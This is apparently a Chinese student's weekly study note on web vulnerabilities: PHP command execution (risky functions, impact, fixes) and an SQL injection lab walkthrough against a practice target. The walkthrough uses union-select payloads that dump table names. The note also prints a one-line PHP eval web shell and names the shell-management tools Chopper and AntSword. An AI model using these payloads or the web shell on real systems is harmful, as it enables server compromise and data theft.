---

title: 第五周学习笔记--命令执行漏洞
date: 2020-09-14 17:43:45
categories: 笔记
description: 应用有时需要调用一些执行系统命令的函数，当用户能控制这些函数的参数时，就可以将恶意系统命令拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。

---
# 第五周学习笔记

## 命令执行漏洞

- **命令执行漏洞原理：**
  应用有时需要调用一些执行系统命令的函数，当用户能控制这些函数的参数时，就可以将恶意系统命令拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。

- **常见php执行系统命令函数**

  ```
  system（）
  exec（）
  shell_exec（）
  passthru（）
  pcntl_exec（）
  popen（）
  proc_open（）
  反引号
  ```

- **漏洞危害：**

  1. 继承Web服务程序的权限去执行系统命令或读写文件
  2. 控制整个网站甚至服务器
  3. 进一步内网渗透

- **漏洞修复：**

  1. 尽量少用执行命令的函数或者直接禁用
  2. 参数值尽量使用引号包括
  3. 在使用动态函数之前，确保使用的函数是指定的函数之一
  4. 在进入执行命令的函数/方法之前，对参数进行过滤，对敏感字符进行转义
  5. 对PHP语言来说，不能完全控制的危险函数最好不要使用

## SQL注入练习

靶机：http://175.24.71.146:18003/Less-1/?id=1

通过实验得：

```
?id=1'`  ：显示异常

?id=1'--+`  ：正常
```

通过order by 确定字段数为3

```
?id=1' order by 1,2,3--+`
?id=1' order by 1,2,3,4--+`
```

然后通过联合查询进行SQL注入

```
http://175.24.71.146:18003/Less-1/?id=-1 union select 1,2，(select GROUP_CONCAT(table_name) from information_schema.tables where TABLE_SCHEMA= security)--+
```

![批注 2020-07-16 094253](C:\Users\captain\Desktop\笔记\批注 2020-07-16 094253.png)

## 漏洞原理

- $sql语句存在变量的拼接，可以被我们控制，变成其他内容


## 修复漏洞

- 通过强制转换为整数intval，过滤字符

- 使用参数化查询接口或在代码级对带入SQL语句中的外部参数进行转义或过滤；

- 对于整数，判断变量是否符合[0-9]的值；其他限定值，也可以进行合法性校验；

- 对于字符串，对SQL语句特殊字符进行转义(单引号转成两个单引号，双引号转成两个双引号)。

  

## 一句话木马

```php
<?php
@eval($_POST['hack']);
```

常用两个工具：菜刀和蚁剑（ant）